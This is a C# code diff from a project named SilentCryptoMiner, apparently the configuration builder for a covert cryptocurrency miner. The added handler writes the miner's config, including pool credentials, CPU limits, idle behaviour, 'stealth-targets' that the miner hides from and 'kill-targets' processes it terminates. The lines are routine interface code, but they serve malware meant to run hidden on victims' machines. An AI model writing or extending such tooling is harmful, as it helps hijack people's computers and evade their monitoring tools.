@@ -39,7 +39,7 @@ namespace SilentCryptoMiner
 
         private void toggleIdle_CheckedChanged(object sender)
         {
-            txtIdleCPU.Enabled = toggleIdle.Checked;
+            comboIdleCPU.Enabled = toggleIdle.Checked;
             txtIdleWait.Enabled = toggleIdle.Checked;
         }
 
@@ -61,6 +61,27 @@ namespace SilentCryptoMiner
         private void comboAlgorithm_SelectedIndexChanged(object sender, EventArgs e)
         {
             formMinerXMR.SubHeader = nid + " - " + comboAlgorithm.Text;
+        }
+
+        private void tabcontrolMinerXMR_SelectedIndexChanged(object sender, EventArgs e)
+        {
+            if (txtPoolURL.Text.Contains(":"))
+            {
+                txtJSON.Text =
+$@"{{
+    ""algo"": ""{comboAlgorithm.Text}"",
+    ""pool"": ""{txtPoolURL.Text.Split(':')[0]}"",
+    ""port"": {txtPoolURL.Text.Split(':')[1]},
+    ""password"": ""{txtPoolPassword.Text}"",
+    ""nicehash"": {toggleNicehash.Checked.ToString().ToLower()},
+    ""ssltls"": ""{toggleSSL.Checked.ToString().ToLower()}"",
+    ""max-cpu"": {comboMaxCPU.Text.Replace("%", "")},
+    ""idle-wait"": {(toggleIdle.Checked ? txtIdleWait.Text : "0")},
+    ""idle-cpu"": {comboIdleCPU.Text.Replace("%", "")},
+    ""stealth-targets"": ""{(toggleStealth.Checked ? txtStealthTargets.Text : "")}"",
+    ""kill-targets"": ""{(toggleProcessKiller.Checked ? txtKillTargets.Text : "")}""
+}}";
+            }
         }
     }
 }
